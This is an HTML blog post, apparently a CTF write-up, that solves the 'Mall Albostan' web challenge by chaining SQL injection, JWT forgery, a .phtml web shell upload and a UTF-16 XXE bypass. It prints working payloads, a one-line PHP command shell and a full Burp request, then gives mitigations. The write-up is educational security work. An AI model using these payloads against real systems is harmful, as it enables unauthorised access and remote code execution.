@@ -1,0 +1,503 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A search box concatenates SQL, so we UNION out the JWT secret, forge an admin token, sneak a .phtml shell past a blacklist, and pivot through a UTF-16 XXE to find where it landed. SQLi to RCE, end to end.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="EYCC: Mall Albostan · 0xAdham">
+  <meta property="og:description" content="A search box concatenates SQL, so we UNION out the JWT secret, forge an admin token, sneak a .phtml shell past a blacklist, and pivot through a UTF-16 XXE to find where it landed. SQLi to RCE, end to end.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>EYCC: Mall Albostan · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">EYCC: Mall Albostan</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-07-31</span>
+        <span>CTF · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> EYCC<br />
+<strong>Challenge:</strong> Mall Albostan<br />
+<strong>Category:</strong> Web<br />
+<strong>Difficulty:</strong> Medium<br />
+<strong>Points:</strong> 484<br />
+<strong>Author:</strong> 00xcanelo</p>
+<p><strong>Solved by 0xAdham and 0xMero.</strong></p>
+<p>Mall Albostan, Downtown Cairo's go-to spot for laptops, GPUs, and everything in between, just launched its first online storefront and internal vendor dashboard. The dev team built it fast to get ahead of the holiday rush — registration's open to anyone, but the actual store management lives behind an admin login that, as far as they're concerned, nobody outside the team will ever see.</p>
+<p>Link: <code>https://mall-albostan.chals.eycc.2hwa.xyz</code></p>
+<h2>From SQL Injection to RCE</h2>
+<h3>TL;DR</h3>
+<p>This challenge chained together five bugs:</p>
+<ol>
+<li><strong>SQL injection</strong> → leak the JWT secret</li>
+<li><strong>Forge a session with <code>role: admin</code></strong> → authenticate as admin</li>
+<li><strong>Bypass the file-upload restrictions</strong> → upload a PHP shell</li>
+<li><strong>XXE</strong> → leak the uploaded file's UUID</li>
+<li><strong>Access the shell with that UUID</strong> → RCE → read the flag</li>
+</ol>
+<p><img alt="Attack chain diagram" src="/blog/eycc-mall-albostan/attack-chain.svg" /></p>
+<h2>Chapter 1: Examining the Source Code</h2>
+<p>I won't walk through all of the source, just the parts that matter.</p>
+<p>After reading <code>register.php</code> and <code>login.php</code> I found nothing abnormal — simple login and register logic.</p>
+<p>Let's look at <code>search.php</code> in the <code>api</code> folder:</p>
+<pre><code class="language-php">&lt;?php
+require_once __DIR__ . '/../lib/auth.php';
+$user = require_login(); // any authenticated user (role=user is enough)
+
+$db = get_db();
+$q = $_GET['q'] ?? '';
+$results = [];
+$ran = false;
+
+if ($q !== '') {
+    $ran = true;
+    $sql = &quot;SELECT id, name, description, price, category FROM products &quot;
+        . &quot;WHERE name LIKE '%$q%' OR category LIKE '%$q%'&quot;;
+
+    $res = $db-&gt;query($sql);
+    if ($res !== false) {
+        while ($row = $res-&gt;fetchArray(SQLITE3_ASSOC)) {
+            $results[] = $row;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<p>That <code>$q</code> goes straight into the query string — <strong>first vulnerability: SQL injection.</strong></p>
+<p>In <code>seed.php</code> we found:</p>
+<pre><code class="language-php">&lt;?php
+
+$appDbFile     = __DIR__ . '/../data/app.db';
+$uploadsDbFile = __DIR__ . '/../data/uploads.db';
+
+if (file_exists($appDbFile) &amp;&amp; file_exists($uploadsDbFile)) {
+    exit(0);
+}
+
+$db = new SQLite3($appDbFile);
+
+$db-&gt;exec(&quot;CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE NOT NULL,
+    password_hash TEXT NOT NULL,
+    role TEXT NOT NULL DEFAULT 'user'
+)&quot;);
+
+$db-&gt;exec(&quot;CREATE TABLE app_config (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    key TEXT UNIQUE NOT NULL,
+    value TEXT NOT NULL
+)&quot;);
+
+$db-&gt;exec(&quot;CREATE TABLE products (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    name TEXT NOT NULL,
+    description TEXT,
+    price REAL,
+    category TEXT
+)&quot;);
+
+$secret = bin2hex(random_bytes(32));
+$stmt = $db-&gt;prepare(&quot;INSERT INTO app_config (key, value) VALUES ('jwt_secret', ?)&quot;);
+$stmt-&gt;bindValue(1, $secret, SQLITE3_TEXT);
+$stmt-&gt;execute();
+
+$randomAdminPass = bin2hex(random_bytes(16));
+$stmt = $db-&gt;prepare(&quot;INSERT INTO users (username, password_hash, role) VALUES ('admin', ?, 'admin')&quot;);
+$stmt-&gt;bindValue(1, password_hash($randomAdminPass, PASSWORD_BCRYPT), SQLITE3_TEXT);
+$stmt-&gt;execute();
+
+$products = json_decode(file_get_contents(__DIR__ . '/products.json'), true);
+
+if ($products === null) {
+    die('Invalid products.json: ' . json_last_error_msg());
+}
+
+$stmt = $db-&gt;prepare(&quot;INSERT INTO products (name, description, price, category) VALUES (?, ?, ?, ?)&quot;);
+foreach ($products as $p) {
+    $stmt-&gt;bindValue(1, $p['name'], SQLITE3_TEXT);
+    $stmt-&gt;bindValue(2, $p['description'], SQLITE3_TEXT);
+    $stmt-&gt;bindValue(3, $p['price'], SQLITE3_FLOAT);
+    $stmt-&gt;bindValue(4, $p['category'], SQLITE3_TEXT);
+    $stmt-&gt;execute();
+    $stmt-&gt;reset();
+}
+
+$uploadsDb = new SQLite3($uploadsDbFile);
+
+$uploadsDb-&gt;exec(&quot;CREATE TABLE uploads (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    uuid_filename TEXT NOT NULL,
+    original_name TEXT,
+    uploaded_by TEXT,
+    uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP
+)&quot;);
+
+echo &quot;[seed] databases initialized\n&quot;;
+</code></pre>
+<p>This page hands us the whole schema — the table structures (column names and datatypes) and the two databases in play (<code>app.db</code>, <code>uploads.db</code>).</p>
+<p>Writing down the findings:</p>
+<ol>
+<li>We know the table structure in both <code>app.db</code> and <code>uploads.db</code>.</li>
+<li>There's an <code>app_config</code> table with <code>key</code>/<code>value</code> columns, and one of the keys is literally <code>jwt_secret</code>.</li>
+</ol>
+<p>Keep this in mind — we'll need it soon.</p>
+<p>Let's look at a more interesting folder: <code>admin</code>.</p>
+<p>In <code>admin</code> we find <code>import.php</code>, <code>upload.php</code>, and <code>index.php</code>. There's nothing interesting in <code>index.php</code> (except that we need an admin role in our session to reach it), so we focus on the other two.</p>
+<p><code>upload.php</code> has an upload function with a blocklist of extensions: <strong><code>php</code>, <code>php1</code>, <code>php2</code>, <code>php3</code>, <code>php4</code>, <code>php5</code>, <code>php7</code>, <code>php8</code>, <code>pht</code>, <code>phps</code>, <code>phar</code>, <code>pl</code>, <code>py</code>, <code>rb</code>, <code>sh</code>, <code>exe</code>, <code>bat</code>.</strong></p>
+<p>But notice — Canelo forgot to add <code>.phtml</code> 😃</p>
+<p>See how I'll get RCE on your server, Canelo — you have to bear the consequences of your mistake 💀</p>
+<p><code>import.php</code> has a weak XML validation function that we can bypass several easy ways (covered in the <strong>Exploiting XXE</strong> section).</p>
+<p>So, to recap what we have:</p>
+<ol>
+<li>Full knowledge of the database schema — database names, tables, columns, and datatypes.</li>
+<li>A SQLi in the search field via <code>search.php</code>.</li>
+<li>A non-blocked PHP extension (<code>.phtml</code>) we can use to upload a shell.</li>
+<li>A weak XML validation function.</li>
+</ol>
+<p>Now for the fun part.</p>
+<h2>Chapter 2: Exploiting the Discovered Vulnerabilities</h2>
+<p>After logging in, we land on this page.</p>
+<p><img alt="Landing page after login" src="/blog/eycc-mall-albostan/landing-page.png" /></p>
+<h3>Section 1: SQL Injection — Leaking the JWT Secret</h3>
+<p>After clicking <strong>Browse Catalog</strong>, we're redirected to <code>products.php</code>, where whatever we type in the search box is passed as the <code>q</code> GET parameter to <code>/api/search.php</code> and dropped straight into the SQL query — no sanitization, no parameterized statements.</p>
+<p><img alt="Products search page" src="/blog/eycc-mall-albostan/products-search.png" /></p>
+<p>From the schema we already know there's a table holding the JWT secret, so that's the first thing we grab.</p>
+<p>Back to this table:</p>
+<pre><code class="language-sql">CREATE TABLE app_config (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    key TEXT UNIQUE NOT NULL,
+    value TEXT NOT NULL
+)
+</code></pre>
+<p>We know the columns and types, but first we need the number of columns in the original query to line up a UNION. 🔥</p>
+<p>And we need to know how the app behaves on error, so we can tell a broken query from a working one.</p>
+<p>First, deliberately break it:</p>
+<p><img alt="Broken query returns no output" src="/blog/eycc-mall-albostan/sqli-error.png" /></p>
+<p>The error isn't shown.</p>
+<p>Now a valid query:</p>
+<p><img alt="Valid query returns rows" src="/blog/eycc-mall-albostan/sqli-valid.png" /></p>
+<p>Good. 🔥 Behavior confirmed: nothing on error, and on a correct query it reflects the output back. Let's extract <code>app_config</code>:</p>
+<pre><code class="language-sql">laptop' UNION SELECT 'test', 'KEY: ' || key, 'Value: ' || value ,'test','test'  FROM app_config --
+</code></pre>
+<p><img alt="UNION leaks the JWT secret" src="/blog/eycc-mall-albostan/sqli-jwt-secret.png" /></p>
+<p><code>||</code> concatenates <code>TEXT</code> values in SQLite.</p>
+<h3>Section 2: Forging an Admin Session</h3>
+<p>Now that we have the secret, we sign our own session cookie with it and set <code>role</code> to <code>admin</code> without breaking the signature.</p>
+<p>For this we use <a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>:</p>
+<pre><code class="language-bash">python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1lcm8iLCJyb2xlIjoidXNlciIsImlhdCI6MTc4NTM0MDk4MH0.TnN_XlOm0pXw_S1vmcVZyaCeinqmBU0UONBP6Qz4bgs -S hs256 -p 71805484665bfc39282d6c491ace51cfae213e5c4d8f82bb63f592147caf0c61 -T
+</code></pre>
+<p>The tool takes the JWT as the first positional argument; the rest are options:</p>
+<ul>
+<li><code>-S hs256</code> — the signing algorithm for the signature.</li>
+<li><code>-p &lt;secret&gt;</code> — the secret key used to sign the token.</li>
+<li><code>-T</code> — interactive tamper mode. We edit the claims, and the tool re-signs with the provided secret, producing a valid JWT.</li>
+</ul>
+<pre><code class="language-text">Token payload values:
+[1] username = &quot;mero&quot;
+[2] role = &quot;user&quot;
+[3] iat = 1785245218    ==&gt; TIMESTAMP = 2026-07-28 16:26:58 (UTC)
+
+Please select a field number:
+&gt; 2
+
+Current value of role is: user
+Please enter new value and hit ENTER
+&gt; admin
+
+jwttool_... - Tampered token - HMAC Signing:
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1lcm8iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODUzNDA5ODB9.ZPuJG5Qpwr1ZdEB4lWDlFzjrnOFVQjr6MToROOm4NlY
+</code></pre>
+<p>And that's our new valid admin session 😍:</p>
+<pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1lcm8iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODUzNDA5ODB9.ZPuJG5Qpwr1ZdEB4lWDlFzjrnOFVQjr6MToROOm4NlY
+</code></pre>
+<p>After swapping the token into browser storage, the admin page opens right up:</p>
+<p><img alt="Admin page accessible with the forged token" src="/blog/eycc-mall-albostan/admin-access.png" /></p>
+<h3>Section 3: Uploading a Shell</h3>
+<p>The admin page lets us upload an attachment (JPEG, PNG, GIF, WebP) and import an XML profile.</p>
+<p><img alt="Admin upload + import XML page" src="/blog/eycc-mall-albostan/admin-upload-import.png" /></p>
+<p>Start with the upload function. It claims to accept only (JPEG, PNG, GIF, WebP) — in practice, not exactly, as we'll break it. 🥱</p>
+<p>Upload a normal GIF first.</p>
+<p><img alt="Normal GIF accepted" src="/blog/eycc-mall-albostan/upload-gif.png" /></p>
+<p>As expected, accepted. But I want to know <em>how</em> the server validates — the <code>Content-Type</code> header, the magic bytes (the first few bytes of a file), or the extension. Let's find out.</p>
+<p>A blocked extension gives this message:</p>
+<p><img alt="Blocked extension rejected" src="/blog/eycc-mall-albostan/upload-blocked-ext.png" /></p>
+<p>I uploaded a <code>.php</code> file (knowing it's a blocked extension) and got rejected. Yes, I'm trying to hack you, and I will.</p>
+<p>Now upload a <code>.phtml</code> file with <code>Content-Type: application/x-httpd-php</code>, to see whether the server checks content type:</p>
+<p><img alt=".phtml accepted" src="/blog/eycc-mall-albostan/upload-phtml-accepted.png" /></p>
+<p>Accepted — so it doesn't check the content type. Let's turn it into a shell.</p>
+<p>Write this into the <code>.phtml</code> file and upload it for RCE:</p>
+<pre><code class="language-php">&lt;?php system($_GET['cmd']) ; ?&gt;
+</code></pre>
+<p>It runs whatever command we pass in the <code>cmd</code> parameter. Example: <code>example.com/shell.phtml?cmd=ls</code> runs <code>ls</code> and reflects its output.</p>
+<p>Upload the shell:</p>
+<p><img alt="Shell rejected" src="/blog/eycc-mall-albostan/upload-shell-rejected.png" /></p>
+<p>Rejected? Maybe the server reads the magic bytes. Let's prepend a GIF magic byte.</p>
+<p><img alt="Shell accepted with GIF magic bytes" src="/blog/eycc-mall-albostan/upload-shell-success.png" /></p>
+<p>There we go — shell uploaded. Getting close, Canelo. Only a matter of time.</p>
+<p>But things don't always go as planned — this isn't the last step. The server stores uploads under a generated UUID, not their original name, because of this in <code>upload.php</code>:</p>
+<pre><code class="language-php">$uuid = generate_uuid4();
+$destName = $uuid . '.'. $ext;
+$destPath = __DIR__ . '/../uploads/' . $destName;
+</code></pre>
+<p>So we still need the UUID our shell landed under.</p>
+<h3>Section 4: XXE — Leaking <code>uploads.db</code></h3>
+<p>The problem Canelo left us with: the shell is uploaded, but it's stored under a random UUID we don't know. That UUID lives in <code>uploads.db</code> — a file that's <code>Require all denied</code> over HTTP, so we can't just request it. We need to read it off the filesystem. That's where the <code>import.php</code> XXE comes in.</p>
+<p>The "Import Settings" page takes XML from <code>POST xml</code>, parses it server-side, and echoes every element's text content back into the Result box. That echo is our exfil channel — whatever an entity resolves to gets reflected straight back to us (classic <strong>in-band XXE</strong>).</p>
+<p><img alt="Import Settings result box" src="/blog/eycc-mall-albostan/import-settings.png" /></p>
+<p><strong>The vulnerable code (<code>/admin/import.php</code>):</strong></p>
+<pre><code class="language-php">function is_safe_xml(string $xml): bool {
+    if (stripos($xml, '&lt;!DOCTYPE') !== false) {   // (1) the &quot;filter&quot;
+        return false;
+    }
+    return true;
+}
+
+$xml = $_POST['xml'];
+if (!is_safe_xml($xml)) {
+    $result = 'Rejected: invalid document format.';
+} else {
+    libxml_use_internal_errors(true);
+    $doc = new DOMDocument();
+    $doc-&gt;resolveExternals    = true;                                       // (2)
+    $doc-&gt;substituteEntities  = true;                                       // (2)
+    $loaded = $doc-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR); // (2)
+
+    foreach ($doc-&gt;getElementsByTagName('*') as $node) {                    // (3) reflection
+        if ($node-&gt;childNodes-&gt;length === 1 &amp;&amp; $node-&gt;firstChild-&gt;nodeType === XML_TEXT_NODE) {
+            $result .= $node-&gt;nodeName . ': ' . $node-&gt;nodeValue . &quot;\n&quot;;
+        }
+    }
+}
+</code></pre>
+<p><strong>Where the vuln is:</strong> the parser is configured maximally dangerous — everything at <code>(2)</code> pushes the same way:</p>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>resolveExternals = true</code></td>
+<td>Resolve external entities (<code>SYSTEM "..."</code>)</td>
+</tr>
+<tr>
+<td><code>substituteEntities = true</code></td>
+<td>Expand entities into the node tree</td>
+</tr>
+<tr>
+<td><code>LIBXML_NOENT</code></td>
+<td>Substitute entities (misleading name — it <strong>enables</strong> substitution)</td>
+</tr>
+<tr>
+<td><code>LIBXML_DTDLOAD</code></td>
+<td>Load the DTD / internal subset (<code>&lt;!DOCTYPE ...&gt;</code>)</td>
+</tr>
+</tbody>
+</table>
+<p>If a <code>&lt;!DOCTYPE&gt;</code> carrying an external entity reaches <code>loadXML</code>, libxml fetches the file off disk and inlines it; the loop at <code>(3)</code> prints it back → <strong>arbitrary file read as <code>www-data</code>.</strong></p>
+<p>Canelo knew XXE was the risk — that's the whole point of <code>is_safe_xml()</code> at <code>(1)</code>. The bug: the "defense" is a <strong>string blacklist on the raw request bytes</strong> (<code>stripos</code> for the literal <code>&lt;!DOCTYPE</code>), not a parser-level control. And a byte blacklist guarding a spec-driven parser is exactly the kind of gap we look for.</p>
+<p><strong>The bypass — encoding mismatch (UTF-16):</strong></p>
+<p><code>stripos($xml, '&lt;!DOCTYPE')</code> searches for the <strong>literal ASCII bytes</strong> <code>3C 21 44 4F 43 54 59 50 45</code>. But <code>DOMDocument::loadXML</code> is a full XML processor — per the XML spec it auto-detects encoding from the <strong>BOM / XML declaration</strong>. That gap is the bypass.</p>
+<p>We submit the <em>same</em> document as <strong>UTF-16</strong>:</p>
+<ul>
+<li>On the wire, <code>&lt;!DOCTYPE</code> becomes <code>3C 00 21 00 44 00 4F 00 43 00 54 00 59 00 50 00 45 00</code> — every ASCII char followed by a <code>00</code>. The contiguous ASCII string <code>&lt;!DOCTYPE</code> <strong>no longer exists in the bytes</strong> → <code>stripos</code> returns <code>false</code> → filter passes.</li>
+<li>libxml sees the UTF-16 BOM (<code>FF FE</code>), decodes back to real characters, sees a valid <code>&lt;!DOCTYPE&gt;</code>, and processes the entity.</li>
+</ul>
+<p>One reader parses <strong>bytes</strong>, the other parses <strong>characters</strong> — the blacklist loses.</p>
+<p>This must be sent as raw UTF-16 bytes in the <code>xml</code> param. Pasting into the browser textarea fails — the browser re-encodes the form to UTF-8, restoring the ASCII <code>&lt;!DOCTYPE</code> → blocked. So we build it in Burp.</p>
+<p><strong>The payload:</strong></p>
+<p>Simple proof first (a text file, reflected directly):</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;!DOCTYPE r [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;r&gt;&amp;xxe;&lt;/r&gt;
+</code></pre>
+<p>But our real target, <code>uploads.db</code>, is a <strong>binary</strong> SQLite file. Raw binary bytes break the XML text node (null bytes, non-UTF-16 sequences), so we wrap it in <code>php://filter/convert.base64-encode</code> — that turns the file into clean base64 text that survives the echo intact. That's why this specific payload:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/data/uploads.db&quot;&gt;]&gt;
+&lt;r&gt;&amp;x;&lt;/r&gt;
+</code></pre>
+<p><strong>Delivery</strong> — send the UTF-16 bytes URL-encoded into <code>xml=</code>. Raw Burp request (spaces as <code>%20</code>, every char followed by <code>%00</code>, BOM <code>%FF%FE</code> up front, <strong>no trailing newline</strong> after the last <code>%00</code>):</p>
+<pre><code class="language-http">POST /admin/import.php HTTP/2
+Host: mall-albostan.chals.eycc.2hwa.xyz
+Cookie: token=&lt;admin JWT from Section 2&gt;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 744
+
+xml=%FF%FE%3C%00%3F%00x%00m%00l%00%20%00v%00e%00r%00s%00i%00o%00n%00%3D%00%22%001%00.%000%00%22%00%20%00e%00n%00c%00o%00d%00i%00n%00g%00%3D%00%22%00U%00T%00F%00-%001%006%00%22%00%3F%00%3E%00%0A%00%3C%00%21%00D%00O%00C%00T%00Y%00P%00E%00%20%00r%00%20%00%5B%00%3C%00%21%00E%00N%00T%00I%00T%00Y%00%20%00x%00%20%00S%00Y%00S%00T%00E%00M%00%20%00%22%00p%00h%00p%00%3A%00%2F%00%2F%00f%00i%00l%00t%00e%00r%00%2F%00c%00o%00n%00v%00e%00r%00t%00.%00b%00a%00s%00e%006%004%00-%00e%00n%00c%00o%00d%00e%00%2F%00r%00e%00s%00o%00u%00r%00c%00e%00%3D%00%2F%00v%00a%00r%00%2F%00w%00w%00w%00%2F%00h%00t%00m%00l%00%2F%00d%00a%00t%00a%00%2F%00u%00p%00l%00o%00a%00d%00s%00.%00d%00b%00%22%00%3E%00%5D%00%3E%00%0A%00%3C%00r%00%3E%00%26%00x%00%3B%00%3C%00%2F%00r%00%3E%00
+</code></pre>
+<p>These UTF-16 bytes are alignment-sensitive — every byte counts. Three ways it silently breaks (all cost me a send before I caught them):</p>
+<table>
+<thead>
+<tr>
+<th>Symptom in the Result box</th>
+<th>Cause</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Rejected: invalid document format.</code></td>
+<td>Body sent as <strong>ASCII</strong> (browser textarea, or <code>%3C%21DOCTYPE…</code> with no <code>%00</code> nulls) → <code>stripos</code> matches</td>
+<td>Send real UTF-16 bytes (<code>%FF%FE</code>, every char + <code>%00</code>)</td>
+</tr>
+<tr>
+<td><code>Extra content at the end of the document</code></td>
+<td>Trailing <strong>CRLF</strong> after the body → UTF-16LE reads <code>0D 0A</code> as one non-whitespace char after <code>&lt;/r&gt;</code></td>
+<td>Delete the trailing newline; body must end on the last <code>%00</code></td>
+</tr>
+<tr>
+<td><code>String not started expecting ' or "</code></td>
+<td>Spaces encoded as <code>+</code> and sent literally → <code>SYSTEM+"…</code></td>
+<td>Percent-encode spaces as <code>%20</code>, not <code>+</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Proof:</strong> the entity <code>&amp;x;</code> resolves to the base64 of <code>uploads.db</code> and gets echoed straight back:</p>
+<p><img alt="Base64 of uploads.db reflected in the result box" src="/blog/eycc-mall-albostan/xxe-uploads-db-b64.png" /></p>
+<p>Decode it and read the upload table to recover our shell's UUID:</p>
+<pre><code class="language-bash">base64 -d b64.txt &gt; uploads.db
+sqlite3 uploads.db 'SELECT * FROM uploads;'
+# 4263252f-1f66-4f0e-ae8b-fecb021b269c.phtml|shell.phtml|mero|2026-07-29 20:38:10
+</code></pre>
+<p>There it is — the UUID of the <code>.phtml</code> shell we uploaded in Section 3. <code>uploads.db</code> was denied over HTTP but wide open to a filesystem read via XXE. Now we know exactly where our shell lives, which is the last thing we needed before we can hit it for RCE.</p>
+<p>Worth noting <em>why</em> we even need XXE here: PHP/libxml XXE can only read <strong>known</strong> paths — it can't list directories. So it can't find the randomly-named flag directly. But it doesn't need to: it reads <code>uploads.db</code> (a known path), which hands us the UUID, which makes the shell reachable. The shell does the directory listing XXE can't. <strong>XXE is the pivot, not the finisher.</strong></p>
+<h2>Chapter 3: Reading the Flag 🚩</h2>
+<p>With the shell's UUID recovered, we can hit its URL directly:</p>
+<pre><code class="language-text">https://mall-albostan.chals.eycc.2hwa.xyz/uploads/4263252f-1f66-4f0e-ae8b-fecb021b269c.phtml?cmd=whoami
+</code></pre>
+<p>Output:</p>
+<p><img alt="whoami confirms RCE" src="/blog/eycc-mall-albostan/rce-whoami.png" /></p>
+<p><strong>Yes — RCE confirmed.</strong></p>
+<p>Now list the root directory:</p>
+<p><img alt="Listing the root directory" src="/blog/eycc-mall-albostan/rce-ls-root.png" /></p>
+<p>The flag is right there 😍 — <code>flag_dff347a6f2124a7184303ea2a6c89045.txt</code>.</p>
+<p>The long-awaited moment:</p>
+<pre><code class="language-bash">cat /flag_dff347a6f2124a7184303ea2a6c89045.txt
+</code></pre>
+<p><img alt="Reading the flag" src="/blog/eycc-mall-albostan/flag.png" /></p>
+<p>The chain is complete, and the flag is ours.</p>
+<pre><code class="language-text">EYCC{...}
+</code></pre>
+<h2>Mitigations</h2>
+<p><strong>Prevent SQL Injection</strong></p>
+<ul>
+<li>Use parameterized queries (prepared statements) instead of concatenating user input into SQL. For example:</li>
+</ul>
+<pre><code class="language-php">$sql = &quot;SELECT id, name, description, price, category
+        FROM products
+        WHERE name LIKE ? OR category LIKE ?&quot;;
+</code></pre>
+<p>instead of:</p>
+<pre><code class="language-php">$sql = &quot;SELECT id, name, description, price, category
+        FROM products
+        WHERE name LIKE '%$q%' OR category LIKE '%$q%'&quot;;
+</code></pre>
+<p><strong>Protect JWT Secrets</strong></p>
+<ul>
+<li>Never hardcode JWT secrets in source or in the database.</li>
+<li>Store secrets in environment variables or a dedicated secrets manager.</li>
+<li>Rotate signing keys periodically and immediately after any suspected compromise.</li>
+</ul>
+<p><strong>Secure File Uploads</strong></p>
+<ul>
+<li>Use a whitelist of allowed extensions instead of a blacklist.</li>
+<li>Validate the file's MIME type and magic bytes.</li>
+<li>Store uploaded files outside the web root whenever possible.</li>
+<li>Disable script execution in the upload directory.</li>
+</ul>
+<p><strong>Prevent XXE Attacks</strong></p>
+<ul>
+<li>Disable external entity resolution in the XML parser.</li>
+<li>Use secure parser configurations instead of custom validation logic.</li>
+<li>Validate XML against a trusted schema when appropriate.</li>
+</ul>
+<p>In conclusion, thanks to <strong>Canelo</strong> for creating such an enjoyable challenge, and to <strong>Mont5ab El2hwa</strong> for organizing an amazing CTF. See you in the finals! 🫡</p>
+<hr />
+<h2>Pro Tip</h2>
+<p>Think the write-up is over? Not quite.</p>
+<p>How would we know the available tables and their columns if they weren't handed to us in the source? Here's the hard way to get the database's structure yourself.</p>
+<p>Every database has table(s) called <strong>system catalogs</strong>, and their location differs between engines. In MySQL, system catalogs live in a separate database called <code>information_schema</code>, which contains tables like <code>columns</code> and <code>tables</code>. In PostgreSQL, they live in a schema called <code>pg_catalog</code>. Don't worry — we'll explain everything.</p>
+<h3>What is a system catalog?</h3>
+<p>A system catalog is a set of tables (and sometimes views) that store metadata about the database itself — its tables, columns, indexes, views, users, and other objects. In short: tables that describe other database objects.</p>
+<h3>What is a schema?</h3>
+<p>Schema isn't a constant definition across all databases:</p>
+<ul>
+<li>In <strong>MySQL</strong>, <code>schema</code> and <code>database</code> mean the same thing — there's no distinction.</li>
+<li>In <strong>PostgreSQL</strong>, a schema is a logical grouping of tables — think of it like a folder. There's a schema called <code>public</code> for user-created tables, and another called <code>pg_catalog</code> for the system catalogs.</li>
+</ul>
+<h3>System catalogs per database</h3>
+<p><strong>MySQL:</strong> a database called <code>information_schema</code> containing tables like <code>columns</code> and <code>tables</code>. These have useful columns such as <code>table_name</code>, <code>table_type</code>, and <code>table_schema</code>.</p>
+<p><strong>PostgreSQL:</strong> system catalogs live under the <code>pg_catalog</code> schema — for example, <code>pg_catalog.pg_tables</code> and <code>pg_catalog.pg_database</code>. They contain columns like <code>table_name</code> and <code>schema_name</code>.</p>
+<p><strong>SQLite:</strong> one table holds information about the database's tables, called <code>sqlite_master</code>. Its columns are <code>type</code>, <code>name</code>, <code>tbl_name</code>, <code>rootpage</code>, and <code>sql</code> — the most important being <code>sql</code>, since it contains the exact statement the table was created with.</p>
+<p>For example:</p>
+<pre><code class="language-sql">SELECT sql FROM sqlite_master;
+</code></pre>
+<p>We get the statement showing how each table was created:</p>
+<pre><code class="language-sql">CREATE TABLE uploads (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    uuid_filename TEXT NOT NULL,
+    original_name TEXT,
+    uploaded_by TEXT,
+    uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP
+)
+CREATE TABLE sqlite_sequence(name, seq)
+</code></pre>
+<h3>What is a view?</h3>
+<p>A view isn't an actual table — it's a virtual one. It doesn't store real data; it stores a query. When someone queries a view, it fetches its data from the actual system catalog behind the scenes.</p>
+<p>For example, in PostgreSQL we can run <code>SELECT * FROM information_schema.tables</code>, although this isn't PostgreSQL's real system catalog — it's a <strong>view</strong>. Under the hood, it runs a query against the real catalog tables in <code>pg_catalog</code> (like <code>pg_class</code> and <code>pg_namespace</code>) and returns the result. MySQL works the same way — <code>information_schema.tables</code> is also a view over the server's internal metadata, not a raw table.</p>
+<p><img alt="information_schema sits on top of pg_catalog" src="/blog/eycc-mall-albostan/system-catalog-diagram.svg" /></p>
+<p>The purple arrow is the key thing to notice: <code>information_schema</code> sits on top and reads from <code>pg_catalog</code> underneath — it's not a second, competing source of truth, just a portable wrapper around the real metadata.</p>
+<p><em>0xAdham &amp; 0xMero</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
